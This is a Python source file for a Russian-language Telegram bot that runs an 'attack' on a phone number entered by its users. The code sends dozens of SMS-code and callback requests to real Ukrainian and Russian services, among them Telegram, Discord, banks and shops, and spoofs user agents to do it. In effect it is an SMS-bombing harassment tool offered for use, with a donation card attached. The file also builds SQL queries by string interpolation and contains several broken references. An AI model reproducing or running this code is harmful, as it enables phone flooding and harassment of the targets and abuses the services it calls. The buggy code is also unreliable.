# - *- coding: utf- 8 -*-
from aiogram import *
from rich.progress import *

import requests
import fake_useragent
import config
import time
import os
import sqlite3
import asyncio
import random
import json
import logging
import markups as nav
import threading
from threading import Thread
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.helper import Helper, HelperMode, ListItem
from rich.console import Console
from rich.progress import *

ADMIN = 77777777 # айди администратора

logging.basicConfig(level=logging.INFO)

storage = MemoryStorage()

bot = Bot(token=config.token)

dp = Dispatcher(bot, storage=storage)

async def anti_flood(*args, **kwargs):
    m = args[0]
    await m.answer("Хватит спамить!")

conn = sqlite3.connect('db.db')
cur = conn.cursor()
cur.execute("""CREATE TABLE IF NOT EXISTS users(
   user_id INTEGER,
   block INTEGER);
""")
conn.commit()

CHANNEL_ID = "-1001732653178"# айди канала

proxies = None

#клавиотура
profile_button = types.KeyboardButton('📱Начать атаку')

referal_button = types.KeyboardButton('Помощь 💻')

pay_button = types.KeyboardButton('💸Поддержать автора')

static_button = types.KeyboardButton("👮‍♂️Статистика")

profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button, static_button).add(pay_button)


class dialog(StatesGroup):
    spam = State()

#Проверка подписки на канал
def check_sub_channel(chat_member):
    print(chat_member['status'])
    if chat_member['status'] != 'left':
        return True
    else:
        return False

def generate_info():
    global _name
    global _email
    global password
    global username
    global _russian
    _russian = "".join([
        random.choice(
            "йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ")
        for x in range(8)
    ])
    _name = "".join([
        random.choice(
            "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
        for x in range(8)
    ])
    password = "".join([
        random.choice(
            "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
        for x in range(11)
    ])
    username = "".join([
        random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
    ])
    _email = ("".join([
        random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
    ]) + "@gmail.com")

async def ukr(number):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
                try:
                        await requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxies=proxies)                        
                except:
                        pass
                try:
                        await requests.post("https://x100ecommerce-api-customers.azurewebsites.net/v1/SendCode", json={"recipient": "+" + number, "retailNetworkId": "4C25DB70-1DCE-11EB-A6EC-7B643829D650", "source": "WEB"}, headers=headers, proxies=proxies)                        
                except:
                        pass
                try:
                        await requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)                        
                except:
                        pass
                try:
                        await requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)                       
                except:
                        pass
                try:
                        await requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "Руслан", "_nonce": "db4f28b9da"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.01.hungrygator.ru/web/auth/webotp", json={"fu": "tralala", "userLogin": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.get(f"https://pay.planetakino.ua/api/v1/auth/send-sms?phone={number}", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://admin.topcredit.ua/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://ucb.z.apteka24.ua/api/send/otp", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://anc.ua/authorization/auth/v2/register", json={"login": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode", json={"mobilePhone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://kasta.ua/api/v2/ssr/login-form", data={"layout": "poe", "email": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://protovar.com.ua/aj_record", data={"object": "callback", "user_name": "Сергей", "contact_phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://mytrinity.com.ua/api.php", data={"type": "recall", "phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.selfiecredit.com.ua/user/send-one-time-password", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.get(f"https://my.maxnet.ua/login/callback/+{number}", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://dnipro-m.ua/uk/phone-verification/", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://www.nl.ua/ua/personal/", data={"component": "bxmaker.authuserphone.login", "method": "sendCode", "phone": number, "registration": "N"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://liki24.com/vnext/api/account/create", json={"email": _email, "firstname": "Сергей", "password": "AsasinKrid00", "referenceCode": "null", "telephone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass

async def russ(number):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
                try:
                        await requests.post("https://dodopizza.ru/api/sendconfirmationcode", data={"phoneNumber": phone}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B" + number, headers=headers,  proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://blanc.ru/api/sso/entrance/login", json={"phoneNumber": number}, headers=headers, proxies=proxies)            
                except:
                        pass
                try:
                        await requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + number}, headers=headers, proxies=proxies)                    
                except:
                        pass
                try:
                        await requests.post("https://www.banki.ru/ng-auth/auth/send-otp/", data={"phone": "+" + number, "isRulesAccepted": "true"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+* (***) ***-****")
                        await requests.post("https://www.vbr.ru/orders/phone/check/", json={"ConfirmationAlwaysRequired": "true", "Email": "", "OrderMethod": "0", "PhoneNumber": formatted_phone, "ValVer": "3"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://services.open.ru/anketa_credit/api/public/credit/cash/application/confirm-code", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+*+(***)+***-**-**")
                        await requests.post("https://online.lenta.com/api.php", json={"tel": formatted_phone, "accept": "on"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await request.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.sunlight.net/v3/customers/authorization/", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://www.askona.ru/local/templates/askona/ajax/callback.php", data={"sessid": "30289f1ba47d156bbf6a76b9b1bf2526", "url": "https://www.askona.ru/", "name": "Сергей", "phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.get(f"https://www.askona.ru/api/registration/sendcode?csrf_token=30289f1ba47d156bbf6a76b9b1bf2526&contact[phone]={number}", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "*(***)***-**-**")
                        await requests.get(f"https://www.noone.ru/local/templates/noone_adaptive/partials/ajax/phone_check.php?phone=+{formatted_phone}&sessid=093af117706a981b5adac061782e5ec2", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+*+(***)+***-**-**")
                        await requests.post("https://lk.rolf.ru/api/register-sms-code", data={"phone": formatted_phone, "_csrf-frontend": "PJCLXGYMbVEOioajx4wxUxbo7kZ_UmNIgggs5LiBdiAM9MkPHn4caUTM05uXynV-WJyPfh0UThDvZEKGyMM8TA=="}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://ru.shein.com/user/auth/phone/validate?_lang=ru&_ver=1.1.8", data={"alias_type": "2", "alias": "7" + number, "area_code": "7", "area_abbr": "RU"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.tsum.ru/authorize/request-sms", json={"data":{"attributes":{"phone": number, "type": "requestsSMS"}}}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(mumber, "8 (***) ***-**-**")
                        await requests.get(f"https://zarina.ru/vue-api/auth/receivesmscode.php?phone={formatted_phone}", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+* (***) ***-**-**")
                        requests.post("https://zoloto585.ru/api/bcard/reg2/", json={"birthdate": "22.11.1990", "city": "Москва", "email": _email, "name": "Сергей", "patronymic": "Сергеевич", "phone":  formatted_phone, "sex": "m", "surname": "Фролов"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://api2.leomax.ru/auth/authcode", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://www.585zolotoy.ru/api/sms/send_code/", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+*+(***)+***-**-**")
                        requests.post("https://www.zlato-grad.ru/", data={"method": "get_code", "phone": formatted_phone, "sessid": "d8b5be403833f8d09c0bd98425ad4d41"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+* (***) ***-****")
                        requests.post("https://zolotodiskont.ru/lk/login/", data={"phone": formatted_phone, "policy": "1"}, headers=headers, proxies=proxies)
                except:
                        pass

@dp.message_handler(commands=['start'])
@dp.throttled(anti_flood,rate=10)
async def start(message: types.Message):
  if message.from_user.id == ADMIN:
    await bot.send_message(message.chat.id, f"Добрый день, {message.from_user.first_name}")
  else:
    await bot.send_message(message.char.id, f"Приветствую, {message.from_user.first_name}\nВы в главном меню.")

@dp.message_handler(text="👮‍♂️Статистика")
async def state(message: types.Message):
        cur = conn.cursor()
        cur.execute('''select * from users''')
        results = cur.fetchall()
        await bot.send_message(message.chat.id, f'👮‍♂️Количество пользователей в боте: {len(results)}')

@dp.message_handler(text="💸Поддержать автора")
async def new_pay(message: types.Message):
    await bot.send_message(message.chat.id, "<pre>💸Monobank-4441114468378870</pre>", parse_mode="html", reply_markup=profile_keyboard)

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    cur = conn.cursor()
    cur.execute(f"SELECT block FROM users WHERE user_id = {message.chat.id}")
    result = cur.fetchone()
    if message.from_user.id == ADMIN:
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(types.InlineKeyboardButton(text="Отправить сообщение пользователям"))
        keyboard.add(types.InlineKeyboardButton(text='Статистика бота'))
        keyboard.add(types.InlineKeyboardButton(text='Назад', callback_data="back"))
        await message.answer(f'<pre>{message.from_user.first_name}</pre>, выберите действие👇', parse_mode="html", reply_markup=keyboard)
    else:
        if result is None:
            cur = conn.cursor()
            cur.execute(f'''SELECT * FROM users WHERE (user_id="{message.from_user.id}")''')
            entry = cur.fetchone()
            if entry is None:
                cur.execute(f'''INSERT INTO users VALUES ('{message.from_user.id}', '0')''')
            conn.commit()
            await message.answer('Вы не являетесь админом.')
        else:
            await message.answer('Вы не являетесь админом.')


@dp.message_handler(content_types=['text'], text='Отправить сообщение пользователям')
async def spam(message: Message):
    if message.from_user.id == ADMIN:
        await dialog.spam.set()
        await message.answer('Введите сообщение, которое получат все пользователи бота')
    else:
        await message.answer('Вы не являетесь админом')


@dp.message_handler(state=dialog.spam)
async def start_spam(message: Message, state: FSMContext):
    if message.text == 'Назад':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(types.InlineKeyboardButton(text="Отправить сообщение пользователям"))
        keyboard.add(types.InlineKeyboardButton(text='Статистика бота'))
        keyboard.add(types.InlineKeyboardButton(text='Назад', reply_markup=back_keyboard))
        await message.answer('Главное меню', reply_markup=keyboard)
        await state.finish()
    else:
        cur = conn.cursor()
        cur.execute(f'''SELECT user_id FROM users''')
        spam_base = cur.fetchall()
        print(spam_base)
        for z in range(len(spam_base)):
            print(spam_base[z][0])
        for z in range(len(spam_base)):
            await bot.send_message(spam_base[z][0], message.text)
        await message.answer(f'✅Сообщение отправлено!')
        await state.finish()

@dp.message_handler(content_types=['text'], text='Статистика бота')
async def state(message: types.Message, state: FSMContext):
    if message.from_user.id == ADMIN:
        cur = conn.cursor()
        cur.execute('''select * from users''')
        results = cur.fetchall()
        inline_keyboard = types.InlineKeyboardMarkup()
        update_static = types.InlineKeyboardButton(text='Обновить статистику', callback_data='update_static')
        inline_keyboard = inline_keyboard.add(update_static)
        await message.answer(f'👮‍♂️Количество пользователей в боте: {len(results)}', reply_markup=inline_keyboard)
    else:
        await message.answer("Невозможно обновить статистику. Обратитесь к [разработчику](https://t.me/soeden1x)", disable_web_page_preview=True, parse_mode="MarkdownV2")

@dp.callback_query_handler(text='update_static')
async def _update_(query: types.CallbackQuery):
    cur = conn.cursor()
    cur.execute('''select * from users''')
    results = cur.fetchall()
    await bot.delete_message(query.from_user.id, query.message.message_id)
    await bot.send_message(query.message.chat.id, f'Обновлено успешно!✅\n👮‍♂️Количество пользователей в боте: {len(results)}')

@dp.callback_query_handler(text='Назад')
async def returnn(query:  types.CallbackQuery):
    await bot.send_message(message.chat.id, "Вы вышли из админ-панели.")


@dp.message_handler(text='Помощь 💻')
@dp.throttled(anti_flood,rate=3)
async def help(message: types.Message):
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='Разработчик👨‍💻', url='https://t.me/soeden1x')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "По всем вопросам, пишите  [разработчику](https://t.me/soeden1x) 😉", disable_web_page_preview=True, parse_mode="MarkdownV2", reply_markup=inline_keyboard)

@dp.message_handler(text='📱Начать атаку')
@dp.throttled(anti_flood,rate=3)
async def echo(message: types.Message):
    await bot.send_message(message.chat.id, 'Введите номер телефона.\nПример:\n<pre>🇺🇦380xxxxxxxxx</pre>\n<pre>🇷🇺7xxxxxxxxxx</pre>', parse_mode="html", reply_markup=profile_keyboard)

@dp.message_handler(content_types=['text'])
@dp.throttled(anti_flood,rate=3)
async def services(message: types.Message):
    inline_keyboard = types.InlineKeyboardMarkup()
    stop_attack = types.InlineKeyboardButton(text='Остановить атаку!', callback_data='stopattack')
    inline_keyboard = inline_keyboard.add(stop_attack)
    phone = (message.text)
    number = message.text.split(' ')
    if len(number[0]) == 11:  
        print(number)
        await message.answer(f'🇷🇺Атака началась на номер <pre>{phone}</pre>!', parse_mode="html", reply_markup=inline_keyboard)
        await russ(number[0])

    elif len(number[0]) == 12:  
        print(number)
        await bot.send_message(message.chat.id, f'🇺🇦Атака началась на номер <pre>{phone}</pre>', parse_mode="html", reply_markup=inline_keyboard)
        await ukr(number[0])
    else:
        None

@dp.callback_query_handler(text='stopattack')
async def stop(query: types.CallbackQuery):
    await bot.delete_message(query.from_user.id, query.message.message_id)
    await bot.send_message(query.from_user.id, "Атака остановлена!")
    os.system("python main.py")


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
